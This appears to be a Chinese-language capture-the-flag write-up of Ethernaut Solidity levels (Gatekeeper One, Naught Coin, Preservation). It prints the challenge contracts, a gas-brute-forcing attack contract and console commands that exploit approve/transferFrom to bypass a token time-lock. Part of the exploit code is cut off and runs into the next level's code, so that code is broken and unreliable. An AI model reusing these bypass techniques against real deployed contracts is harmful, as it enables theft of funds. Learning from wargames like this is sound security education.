[Ethernaut题解2022版（上）链接](https://xz.aliyun.com/t/11059#toc-0)
# 13\. Gatekeeper One
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    import '@openzeppelin/contracts/math/SafeMath.sol';
    contract GatekeeperOne {
      using SafeMath for uint256;
      address public entrant;
      modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
      }
      modifier gateTwo() {
        require(gasleft().mod(8191) == 0);
        _;
      }
      modifier gateThree(bytes8 _gateKey) {
          require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
          require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
          require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
        _;
      }
      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
      }
    }
合约意图很明显，就是让我们通过`gateOne`、`gateTwo`、`gateThree`三个函数修饰器的检查，执行enter函数即可。分别分析一下通过的条件。
## 13.1 gateOne
对gateOne来说，msg.sender是直接调用合约的地址，而tx.origin则是这笔交易的原始调用者，举个例子，如果有合约A、B、C、D，一次合约调用是D->B->A->C，那么对于C来说，msg.sender是A，tx.origin是D。因此只需要在外部设置一个中间合约，再依次对`enter`函数发起调用即可满足`msg.sender
!= tx.origin`
## 13.2 gateTwo
查询官方文档可知，`gasleft`函数返回的是交易剩余的gas量，这个检查的条件是让gasleft为8191的整数倍。我们只需要设置gas为8191*n+x即可，其中x是我们本次交易需要消耗的gas，这个值可以通过debug得到，然后通过`call`方式远程调用函数可以指定需要消耗的gas，只需指定gas为对应的x即可。
> 这个bypass属实坐牢，因为要通过debug方式获得题目对应消耗的gas的话，必须跟题目使用相同的编译器版本和对应的优化选项，然而并不知道题目版本。
还有另一种思路，就是爆破x，因为gas消耗总归是有个范围的，我们只需要在这个范围内爆破即可，见下面的攻击代码。
## 13.3 gateThree
这个主要考察了solidity的类型转换规则，[参考链接](https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256.)
这里以`_gateKey`是`0x12345678deadbeef`为例说明
  * `uint32(uint64(_gateKey))`转换后会取低位，所以变成`0xdeadbeef`，`uint16(uint64(_gateKey))`同理会变成`0xbeef`，uint16和uint32在比较的时候，较小的类型uint16会在左边填充0，也就是会变成0x0000beef和0xdeadbeef做比较，因此想通过第一个require只需要找一个形为`0x????????0000????`这种形式的值即可，其中?是任取值。
  * 第二步要求双方不相等，只需高4个字节中任有一个bit不为0即可
  * 通过前面可知，`uint32(uint64(_gateKey))`应该是类似`0x0000beef`这种形式，所以只需要让最低的2个byte和tx.origin地址最低的2个byte相同即可，也就是，key的最低2个字节设置为合约地址的低2个字节。这里tx.origin就是metamask的账户地址
## 13.4 exploit
于是写出最终攻击代码如下，其中gas爆破部分参考[这个](https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol):
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    interface GatekeeperOne {
        function entrant() external returns (address);
        function enter(bytes8 _gateKey) external returns (bool);
    }
    contract attack {
        GatekeeperOne gatekeeperOne;
        address target;
        address entrant;
        event log(bool);
        event logaddr(address);
        constructor(address _addr) public {
            // 设置为题目地址
            target = _addr;
        }
        function exploit() public {
            // 后四位是metamask上账户地址的低2个字节
            bytes8 key=0xAAAAAAAA00004261;
            bool result;
            for (uint256 i = 0; i  timeLock);
          _;
        } else {
         _;
        }
      } 
    }
>
> 这个题注意一点，现在import里面那个合约会提示版本不对，因为现在ERC20.sol已经更新到v0.8.0了，通过查历史发现`v3.2.0`版本还支持0.6.0编译器，因此可以修改一下导入的ERC20合约的地址
根据构造代码可以看到，题目一开始将该代币中所有的token都转移给了我们的账户，通关的要求就是我们把手里的代币全部转给另外一个。但题目对erc20的转账函数`transfer`做了限制，`player`只有10年后才能转账，因此需要绕过。
这里很简单，因为`localTokens`只限制了`transfer`函数的msg.sender不能为player,但在限制erc20标准中还有另一个转账函数`transferFrom`，其函数原型如下：
    function transferFrom(
            address from,
            address to,
            uint256 amount
        ) public virtual override returns (bool) {
            address spender = _msgSender();
            _spendAllowance(from, spender, amount);
            _transfer(from, to, amount);
            return true;
        }
但注意一点是，在转账前需要先使用approve函数授权，然后再调用此函数转账即可。代码很简单，在题目控制台执行
    //secondaddr是另外一个账户地址
    secondaddr='0xCB3D2F536f533869f726F0A3eA2907CAA67DDca1'
    totalvalue='1000000000000000000000000'
    //给自己授权
    await contract.approve(player,totalvalue)
    await contract.transferFrom(player,secondaddr,totalvalue)
这个题目总结起来就是以下两点：
  * erc20合约标准中有2个转账函数，如果只对其中一个做限制我们可以使用另一个绕过
  * 转账需要授权。
# 16\. Preservation
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract Preservation {
      // public library contracts 
      address public timeZone1Library;
      address public timeZone2Library;
      address public owner; 
      uint storedTime;
      // Sets the function signature for delegatecall
      bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
      constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
        timeZone1Library = _timeZone1LibraryAddress; 
        timeZone2Library = _timeZone2LibraryAddress; 
        owner = msg.sender;
      }
      // set the time for timezone 1
      function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
      }
      // set the time for timezone 2
      function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
      }
    }
    // Simple library contract to set the time
    contract LibraryContract {
      // stores a timestamp 
      uint storedTime;  
      function setTime(uint _time) public {
        storedTime = _time;
      }
    }
本题的关键点在于`delegatecall`，`delegatecall`具体用法可以看第6题题解。它的功能相当于我们切换到执行地址的上下文环境中去执行函数。而这里2个函数中的`delegatecall`调用的都是`setTime`这个函数，可以看到这个函数的作用是修改其storage方式存储的第一个变量`storedTime`。
首先，分别画一下两个合约中storage变量存储空间图，对于`Preservation`合约，其有4个变量，变量分布情况如下：
    ===================================================
        unused       |                timeZone1Library
    ---------------------------------------------------         slot 0
        12 bytes     |                20 bytes
    ===================================================
        unused       |                timeZone2Library
    ---------------------------------------------------         slot 1
        12 bytes     |                20 bytes
    ===================================================
        unused       |                owner
    ---------------------------------------------------         slot 2
        12 bytes     |                20 bytes
    ===================================================
                    storedTime
    ---------------------------------------------------         slot 3
                    32 bytes
    ===================================================
而对于`LibraryContract`合约，如下:
    ===================================================